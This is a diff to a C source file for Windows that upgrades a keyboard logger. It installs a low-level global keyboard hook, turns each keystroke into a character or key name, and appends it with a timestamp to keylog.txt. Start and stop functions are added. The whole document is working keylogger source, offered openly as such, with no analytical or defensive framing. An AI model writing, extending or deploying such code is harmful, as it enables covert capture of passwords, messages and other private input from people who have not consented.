@@ -1,39 +1,75 @@
-#include <windows.h>
+#include "hooks.h"
 #include <stdio.h>
+#include <time.h>
+#include <windows.h>
 
-HHOOK hHook;
-FILE *logFile;
+static HHOOK hHook;
+static FILE *logFile;
+static int shiftPressed = 0;
+
+char getCharFromVK(DWORD vkCode) {
+    BYTE keyboardState[256];
+    GetKeyboardState(keyboardState);
+
+    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
+    WCHAR buffer[5];
+    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);
+
+    if (result == 1) {
+        return (char)buffer[0]; // Return the character typed
+    }
+    return 0; // For non-character keys
+}
+
+char* getTimestamp() {
+    static char timeStr[64];
+    time_t now = time(NULL);
+    struct tm *t = localtime(&now);
+    strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
+    return timeStr;
+}
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = kbd->vkCode;
 
         logFile = fopen("keylog.txt", "a+");
         if (logFile) {
-            fprintf(logFile, "%d ", vkCode); // Raw key code
+            char ch = getCharFromVK(vkCode);
+
+            fprintf(logFile, "%s ", getTimestamp());
+
+            if (ch) {
+                fprintf(logFile, "%c\n", ch);
+            } else {
+                // For non-printable keys like Enter, Shift, etc.
+                char keyName[32];
+                UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
+                GetKeyNameText(scanCode << 16, keyName, sizeof(keyName));
+                fprintf(logFile, "[%s]\n", keyName);
+            }
+
             fclose(logFile);
         }
     }
     return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
-int main() {
+void StartKeyLogger() {
     MSG msg;
-
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (!hHook) {
         printf("Failed to install hook!\n");
-        return 1;
+        return;
     }
-
-    printf("Keylogger started. Press ESC to exit.\n");
-
+    printf("Keylogger started. Logging to keylog.txt\n");
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+}
 
+void StopKeyLogger() {
     UnhookWindowsHookEx(hHook);
-    return 0;
 }
